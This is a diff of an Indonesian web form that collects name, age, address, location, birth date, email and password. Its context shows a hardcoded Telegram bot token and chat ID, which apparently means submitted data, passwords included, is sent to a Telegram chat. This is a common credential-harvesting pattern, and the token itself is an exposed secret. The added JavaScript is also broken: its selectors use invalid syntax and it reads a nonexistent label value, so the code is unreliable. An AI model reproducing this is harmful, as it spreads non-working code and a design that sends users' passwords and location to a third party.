@@ -16,31 +16,31 @@
     <label>Opsional</label>
     <br>
     <form id="form">
-      <label>Nama :</label>
+      <label data-id="2">Nama :</label>
       <br>
-      <input id="nama" type="name" placeholder="Masukkan Nama" required></input>
+      <input data-id="1" type="name" placeholder="Masukkan Nama" required></input>
       <br>
-      <label>Umur :</label>
+      <label data-id="2">Umur :</label>
       <br>
-      <input type="number" id="umur" placeholder="Umur" required></input>
+      <input type="number" data-id="1" placeholder="Umur" required></input>
       <br>
-      <label>Alamat :</label>
+      <label data-id="2">Alamat :</label>
       <br>
-      <textarea id="lokasi" placeholder="Masukkan Alamat / Dapatkan Lokasi Langsung" required></textarea>
+      <textarea data-id="1" placeholder="Masukkan Alamat / Dapatkan Lokasi Langsung" required></textarea>
       <br>
       <button onclick="getLocation()">Dapatkan Lokasi</button>
       <br>
-      <label>Tanggal Lahir :</label>
+      <label data-id="2">Tanggal Lahir :</label>
       <br>
-      <input type="date" id="tgl_lahir" required></input>
+      <input type="date" data-id="1" required></input>
       <br>
-      <label>Email :</label>
+      <label data-id="2">Email :</label>
       <br>
-      <input id="email" type="email" placeholder="Masukkan Email" required></input>
+      <input data-id="1" type="email" placeholder="Masukkan Email" required></input>
       <br>
-      <label>Kata Sandi :</label>
+      <label data-id="2">Kata Sandi :</label>
       <br>
-      <input type="password" id="kata_sandi" placeholder="Masukkan Kata Sandi" required></input>
+      <input type="password" data-id="1" placeholder="Masukkan Kata Sandi" required></input>
       <br>
       <input type="submit" onclick="sendText()"></input>
     
@@ -52,11 +52,21 @@
       var req = document.getElementById('req');
       opt.addEventListener("click", function() {
         req.checked = false
+       var a = document.querySelector('form[data-id:"1"]')
+        var b = document.querySelector('label[data-id:"2"]')
+        b.innerText = b.value + " Opsional"
+        a.required = false
+        
       })
       req.addEventListener("click", function() {
         opt.checked = false
+        var a = document.querySelector('form[data-id:"1"]')
+        a.required = true
+        var b = document.querySelector('label[data-id:"2"]')
+        b.innerText = b.value + " Wajib"
+        
       })
-   const botToken = '5906990752:AAHv8iFSmHu4MC4SM_IB3EZSiyTLxaZULvM';
+      const botToken = '5906990752:AAHv8iFSmHu4MC4SM_IB3EZSiyTLxaZULvM';
 const chatId = '-1001983705713';
 
 async function telegramRequest(method, data) {
